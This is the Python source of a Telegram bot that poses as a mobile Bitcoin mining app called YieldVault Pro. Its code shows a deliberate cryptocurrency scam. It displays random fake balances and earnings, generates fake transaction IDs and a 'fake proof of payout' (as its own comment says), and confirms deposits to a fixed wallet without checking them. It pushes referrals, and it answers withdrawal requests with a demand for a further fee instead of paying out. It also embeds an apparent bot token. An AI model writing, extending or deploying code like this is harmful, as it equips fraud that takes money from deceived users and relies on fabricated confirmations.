import telebot
from telebot import types
import time
import threading
import random
import json
import os

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

# 🏦 FIRMA WALLET — ZA ISPLATE I DEPOZITE
FIRM_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📁 USER DATA FILE
DATA_FILE = "users.json"

# 🧠 Učitaj podatke
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f)

# 🧩 Default user
def default_user():
    return {
        "balance": round(random.uniform(0.000010, 0.000015), 9),
        "sat_balance": 12,
        "hash_rate": round(random.uniform(0.000001, 0.000003), 9),
        "level": 1,
        "devices": ["Miner_Lv1"],
        "last_mine": time.time(),
        "total_earned": 0.0,
        "referrals": [],
        "boost_active": False
    }

# 🔍 Dohvati usera
def get_user(user_id):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = default_user()
        save_data(data)
    return data[uid]

def update_user(user_id, updates):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = default_user()
    data[uid].update(updates)
    save_data(data)

# 🧠 Generiši TXID
def generate_txid():
    return ''.join(random.choices('abcdef0123456789', k=64))

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    txid = generate_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ WITHDRAWAL CONFIRMED
Amount: {amount_btc:.6f} BTC
Wallet: {FIRM_WALLET[:10]}...{FIRM_WALLET[-6:]}
TXID: `{txid[:8]}••••••••`
Time: {date}
Status: 6/6 Confirmations'''

# 🎮 APP SIMULATOR — KAO NA YOUTUBE REKLAMI
def app_screen(user):
    current_btc_price = round(random.uniform(60000, 72000), 2)
    monthly_earnings = user["balance"] * 30 * 24 * 60 * 60
    return f'''📱 *YieldVault Pro — Mobile Mining App*
      [ YIELDVAULT PRO ]
      Balance: {user["balance"]:.9f} BTC
      +{user["hash_rate"]:.9f} BTC/s

      [⚡ EARNINGS PER MONTH]
      {monthly_earnings:.6f} BTC

      [💰 BTC PRICE]
      $ {current_btc_price} USD

      [⛏️ MINING STATUS]
      Active • Level {user["level"]}

🔧 *Tap a button below to interact:*'''

# 🎮 Bottom navigation — Home, Boost, Friends, Earn, More
def app_menu():
    markup = types.InlineKeyboardMarkup()
    home = types.InlineKeyboardButton("🏠 Home", callback_data='home')
    boost = types.InlineKeyboardButton("⚡ Boost", callback_data='boost')
    friends = types.InlineKeyboardButton("👥 Friends", callback_data='friends')
    earn = types.InlineKeyboardButton("🎁 Earn", callback_data='earn')
    more = types.InlineKeyboardButton("⚙️ More", callback_data='more')
    markup.add(home, boost, friends, earn, more)
    return markup

# 🚀 Start — APP SE "POKREĆE"
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    user = get_user(user_id)

    # 🎉 APP SE OTVARA — KAO NA YOUTUBE REKLAMI
    welcome = f'''📱 *YieldVault Pro — Mobile Mining App*

Welcome to the future of Bitcoin mining.

Your app is loading...

🔄 Syncing blockchain...  
✅ Connected to YieldVault Pro Network  
🟢 Mining active

      Balance: {user["balance"]:.9f} BTC
      +{user["hash_rate"]:.9f} BTC/s
      Level: {user["level"]}

💸 Deposit BTC to `{FIRM_WALLET}` to upgrade.

Send TXID: `/deposit YOUR_TXID_HERE`

Your first reward in 8 minutes.'''

    bot.reply_to(message, welcome, reply_markup=app_menu(), parse_mode='Markdown')

# 🔘 Callback handler — APP navigacija
@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    user_id = call.message.chat.id
    user = get_user(user_id)

    if call.data == 'home':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=app_screen(user),
            reply_markup=app_menu(),
            parse_mode='Markdown'
        )

    elif call.data == 'boost':
        if user["boost_active"]:
            bot.answer_callback_query(call.id, text="Boost already active!", show_alert=True)
            return
        boost = round(random.uniform(0.0000001, 0.0000005), 9)
        new_hr = user["hash_rate"] + boost
        update_user(user_id, {"hash_rate": new_hr, "boost_active": True})
        bot.answer_callback_query(call.id, text=f"+{boost:.9f} BTC/s activated!", show_alert=True)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''⚡ *Boost Activated!*

+{boost:.9f} BTC/s added to your mining rate.

New hash rate: {new_hr:.9f} BTC/s

🔋 Boost active for 24h.

Keep mining!''',
            reply_markup=app_menu(),
            parse_mode='Markdown'
        )

    elif call.data == 'friends':
        ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''👥 *Invite Friends & Earn 10%*

Share your link:
`{ref_link}`

For every friend who deposits:
• You get 10% of their first deposit
• They get +0.000001 BTC/s

More friends = more power.''',
            reply_markup=app_menu(),
            parse_mode='Markdown'
        )

    elif call.data == 'earn':
        now = time.time()
        time_earned = (now - user["last_mine"]) / 600
        if time_earned < 1: time_earned = 0
        earned = user["hash_rate"] * 1000 * time_earned
        new_balance = user["balance"] + earned
        update_user(user_id, {"balance": new_balance, "total_earned": user["total_earned"] + earned, "last_mine": now})
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''🎁 *Mining Reward Claimed!*

You earned: {earned:.9f} BTC

New balance: {new_balance:.9f} BTC

🔁 Available every 10 minutes.''',
            reply_markup=app_menu(),
            parse_mode='Markdown'
        )

    elif call.data == 'more':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='''⚙️ *More Options*

• 🛠 Settings  
• 📊 Stats  
• 💬 Support  
• 📄 Whitepaper  
• 🔐 Security  

Use `/withdraw` to cash out.''',
            reply_markup=app_menu(),
            parse_mode='Markdown'
        )

# 🧾 Depozit
@bot.message_handler(commands=['deposit'])
def deposit_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send TXID:\n`/deposit abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.choice([0.005, 0.01, 0.025, 0.05, 0.1, 0.5]), 4)
    hash_boost = amount * 0.0001
    user = get_user(message.chat.id)
    new_hr = user["hash_rate"] + hash_boost
    update_user(message.chat.id, {"hash_rate": new_hr})
    bot.reply_to(message, f'''✅ *Deposit Confirmed*

You've upgraded your mining power!

• +{hash_boost:.9f} BTC/s
• Total Hash Rate: {new_hr:.9f} BTC/s

Your balance grows faster now.''', parse_mode='Markdown')

# 🧾 Isplata
@bot.message_handler(commands=['withdraw'])
def withdraw_cmd(message):
    user = get_user(message.chat.id)
    if user["balance"] < 0.001:
        bot.reply_to(message, "❌ Minimum withdrawal: 0.001 BTC")
        return
    bot.reply_to(message, f'''📤 *Withdrawal Requested*

Amount: {user["balance"]:.6f} BTC
Wallet: `{FIRM_WALLET}`

Processing...

🔄 Security check: 1/3  
Verifying mining history...''', parse_mode='Markdown')
    time.sleep(2)
    bot.send_message(message.chat.id, '''✅ Verified

Send 0.0001 BTC fee to:
`{FIRM_WALLET}`

Then send TXID: `/fee TXID_HERE`''')

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro App Simulator is live.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
Coder Pro
